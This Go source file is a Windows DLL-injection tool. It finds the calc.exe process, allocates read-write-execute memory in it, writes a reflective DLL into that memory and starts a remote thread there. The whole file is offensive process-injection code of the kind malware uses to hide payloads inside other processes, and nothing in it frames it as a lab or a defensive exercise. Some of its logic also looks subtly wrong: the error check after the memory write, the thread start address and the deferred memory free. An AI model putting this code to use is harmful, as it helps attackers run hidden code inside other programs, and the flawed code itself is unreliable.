package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	openProcess             = kernel32.NewProc("OpenProcess")
	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory      = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread      = kernel32.NewProc("CreateRemoteThread")
	virtualFreeEx           = kernel32.NewProc("VirtualFreeEx")
	processVmWrite          = uintptr(0x0020) // VM_WRITE
	processCreateThread     = uintptr(0x0002) // CREATE_THREAD
	processQueryInformation = uintptr(0x0400) // QUERY_INFORMATION
	desiredAccess           = processVmWrite | processCreateThread | processQueryInformation
	memCommitReserve        = uintptr(0x3000) // MEM_COMMIT | MEM_RESERVE
	pageExecuteReadWrite    = uintptr(0x40)   // PAGE_EXECUTE_READWRITE
	memRelease              = uintptr(0x8000) // MEM_RELEASE for VirtualFreeEx
)

func main() {
	pid, err := getTargetPID("calc.exe")
	if err != nil {
		log.Fatalf("Could not get target process PID: %v", err)
	}
	fmt.Printf("Target process PID: %d\n", pid)

	handle, _, err := openProcess.Call(desiredAccess, 0, uintptr(pid))
	if handle == 0 {
		log.Fatalf("Failed to open process: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	dllPath := ".\\reflective_dll.dll"
	fmt.Printf("Injecting DLL from path: %s\n", dllPath)

	dllBytes, err := os.ReadFile(dllPath)
	if err != nil {
		log.Fatalf("Failed to read DLL file: %v", err)
	}

	remoteMemoryAddress, err := injectDLL(handle, dllBytes)
	if err != nil {
		log.Fatalf("DLL injection failed: %v", err)
	}
	fmt.Printf("Injected DLL at remote address: 0x%x\n", remoteMemoryAddress)

	defer CleanUpMemory(syscall.Handle(handle), remoteMemoryAddress)
}

func getTargetPID(processName string) (int, error) {
	out, err := exec.Command("tasklist").Output()
	if err != nil {
		return 0, fmt.Errorf("failed to run tasklist: %v", err)
	}

	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) > 1 && fields[0] == processName {
			pid, _ := strconv.Atoi(fields[1])
			return pid, nil
		}
	}
	return 0, fmt.Errorf("%s process not found", processName)
}

func injectDLL(handle uintptr, dllBytes []byte) (uintptr, error) {
	remoteAddress, _, err := virtualAllocEx.Call(handle, 0, uintptr(len(dllBytes)), memCommitReserve, pageExecuteReadWrite)
	if remoteAddress == 0 {
		return 0, fmt.Errorf("memory allocation failed: %v", err)
	}

	_, _, err = writeProcessMemory.Call(handle, remoteAddress, uintptr(unsafe.Pointer(&dllBytes[0])), uintptr(len(dllBytes)), 0)
	if err != nil {
		return 0, fmt.Errorf("write process memory failed: %v", err)
	}

	thread, _, err := createRemoteThread.Call(handle, 0, 0, remoteAddress, 0, 0, 0)
	if thread == 0 {
		return 0, fmt.Errorf("create remote thread failed: %v", err)
	}

	return remoteAddress, nil
}

func CleanUpMemory(handle syscall.Handle, address uintptr) error {
	r, _, err := virtualFreeEx.Call(uintptr(handle), address, 0, memRelease)
	if r == 0 {
		return fmt.Errorf("failed to free memory in target process: %v", err)
	}
	return nil
}
